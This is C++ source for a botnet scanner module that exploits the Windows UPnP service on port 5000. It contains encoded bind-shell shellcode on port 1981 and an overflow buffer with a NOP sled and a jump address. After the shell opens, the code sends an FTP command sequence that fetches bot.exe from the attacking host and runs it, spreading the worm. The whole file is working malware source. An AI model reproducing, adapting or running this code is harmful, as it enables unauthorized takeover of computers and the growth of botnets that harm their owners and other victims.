#include "main.h"
#include "mainctrl.h"
#include "utility.h"

class CScannerUPNP :
	public CScannerBase
{
public:
	CScannerUPNP(void);
	virtual ~CScannerUPNP() throw() { }
	bool	Exploit(void);
};

// works hidden cmd.exe
char phatty_rshell_upnp[] = //bind port 1981
	"\xEB\x10\x5A\x4A\x33\xC9\x66\xB9\x66\x01\x80\x34\x0A\x99\xE2\xFA"
	"\xEB\x05\xE8\xEB\xFF\xFF\xFF" 
	"\x70\x99\x98\x99\x99\xC3\x21\x95\x69\x64\xE6\x12\x99\x12\xE9\x85"
	"\x34\x12\xD9\x91\x12\x41\x12\xEA\xA5\x9A\x6A\x12\xEF\xE1\x9A\x6A"
	"\x12\xE7\xB9\x9A\x62\x12\xD7\x8D\xAA\x74\xCF\xCE\xC8\x12\xA6\x9A"
	"\x62\x12\x6B\xF3\x97\xC0\x6A\x3F\xED\x91\xC0\xC6\x1A\x5E\x9D\xDC"
	"\x7B\x70\xC0\xC6\xC7\x12\x54\x12\xDF\xBD\x9A\x5A\x48\x78\x9A\x58"
	"\xAA\x50\xFF\x12\x91\x12\xDF\x85\x9A\x5A\x58\x78\x9B\x9A\x58\x12"
	"\x99\x9A\x5A\x12\x63\x12\x6E\x1A\x5F\x97\x12\x49\xF3\x9A\xC0\x71"
	"\xE5\x99\x99\x99\x1A\x5F\x94\xCB\xCF\x66\xCE\x65\xC3\x12\x41\xF3"
	"\x9D\xC0\x71\xF0\x99\x99\x99\xC9\xC9\xC9\xC9\xF3\x98\xF3\x9B\x66"
	"\xCE\x69\x12\x41\x5E\x9E\x9B\x99\x9E\x24\xAA\x59\x10\xDE\x9D\xF3"
	"\x89\xCE\xCA\x66\xCE\x6D\xF3\x98\xCA\x66\xCE\x61\xC9\xC9\xCA\x66"
	"\xCE\x65\x1A\x75\xDD\x12\x6D\xAA\x42\xF3\x89\xC0\x10\x85\x17\x7B"
	"\x62\x10\xDF\xA1\x10\xDF\xA5\x10\xDF\xD9\x5E\xDF\xB5\x98\x98\x99"
	"\x99\x14\xDE\x89\xC9\xCF\xCA\xCA\xCA\xF3\x98\xCA\xCA\x5E\xDE\xA5"
	"\xFA\xF4\xFD\x99\x14\xDE\xA5\xC9\xCA\x66\xCE\x7D\xC9\x66\xCE\x71"
	"\xAA\x59\x35\x1C\x59\xEC\x60\xC8\xCB\xCF\xCA\x66\x4B\xC3\xC0\x32"
	"\x7B\x77\xAA\x59\x5A\x71\x62\x67\x66\x66\xDE\xFC\xED\xC9\xEB\xF6"
	"\xFA\xD8\xFD\xFD\xEB\xFC\xEA\xEA\x99\xDA\xEB\xFC\xF8\xED\xFC\xC9"
	"\xEB\xF6\xFA\xFC\xEA\xEA\xD8\x99\xDC\xE1\xF0\xED\xC9\xEB\xF6\xFA"
	"\xFC\xEA\xEA\x99\xD5\xF6\xF8\xFD\xD5\xF0\xFB\xEB\xF8\xEB\xE0\xD8"
	"\x99\xEE\xEA\xAB\xC6\xAA\xAB\x99\xCE\xCA\xD8\xCA\xF6\xFA\xF2\xFC"
	"\xED\xD8\x99\xFB\xF0\xF7\xFD\x99\xF5\xF0\xEA\xED\xFC\xF7\x99\xF8"
	"\xFA\xFA\xFC\xE9\xED\x99";

CScannerUPNP::CScannerUPNP() { m_szType = "CScannerUPNP"; m_sScannerName.Assign("UPNP"); }

bool CScannerUPNP::Exploit(void)
{
	char szRequest[2048], szJmpCode[281], szExeCode[840], szRecvBuf[5096];
	int i;

	for(i=0; i<268; i++) szJmpCode[i]=(char)0x90;

	szJmpCode[268]=(char)0x4D; szJmpCode[269]=(char)0x3F;
	szJmpCode[270]=(char)0xE3; szJmpCode[271]=(char)0x77;
	szJmpCode[272]=(char)0x90; szJmpCode[273]=(char)0x90;
	szJmpCode[274]=(char)0x90; szJmpCode[275]=(char)0x90;
	
	//jmp [ebx+0x64], jump to execute shellcode
	szJmpCode[276]=(char)0xFF; szJmpCode[277]=(char)0x63;
	szJmpCode[278]=(char)0x64; szJmpCode[279]=(char)0x90;
	szJmpCode[280]=(char)0x00;

	for(i=0; i<32; i++) szExeCode[i]=(char)0x90;
	szExeCode[32]=(char)0x00;

	strcat(szExeCode, phatty_rshell_upnp);

	sprintf(szRequest, "%s%s\r\n\r\n", szJmpCode, szExeCode);

	// Connect to the server
	if(!m_sSocket.Connect(m_sSocket.m_szHost, 5000)) // Connect failed, exit
	{	return false; }

	if(!m_sSocket.Write(szRequest, strlen(szRequest))) {
		m_sSocket.Disconnect(); return false; }

	Sleep(10000); CSocket outSocket;

	if(!outSocket.Connect(m_sSocket.m_szHost, 1981)) // Connect failed, exit
	{	m_sSocket.Disconnect(); return false; }

	char mkdir_buff[400]="";
	int iPort=g_pMainCtrl->m_cBot.bot_ftrans_port_ftp.iValue;

	sprintf(mkdir_buff,
		"echo open %s %d > bla.txt\n"
		"echo user blah blah >> bla.txt\n"
		"echo binary >> bla.txt\n"
		"echo get %s >> bla.txt\n"
		"echo quit >> bla.txt\n"
		"ftp.exe -n -s:bla.txt\n"
		"%s\n",
		g_pMainCtrl->m_cIRC.m_sLocalIp.CStr(), iPort, "bot.exe", "bot.exe");

	if(!outSocket.RecvTO(szRecvBuf, sizeof(szRecvBuf), 5000)) {
		m_sSocket.Disconnect(); outSocket.Disconnect(); return false; }

	Sleep(500);

	if(!outSocket.Write((char*)mkdir_buff, sizeof(mkdir_buff))) {
		m_sSocket.Disconnect(); outSocket.Disconnect(); return false; }


	m_sSocket.Disconnect(); return false;
}

REGSCANNER(UPNP_5000, UPNP, 5000, true, true)
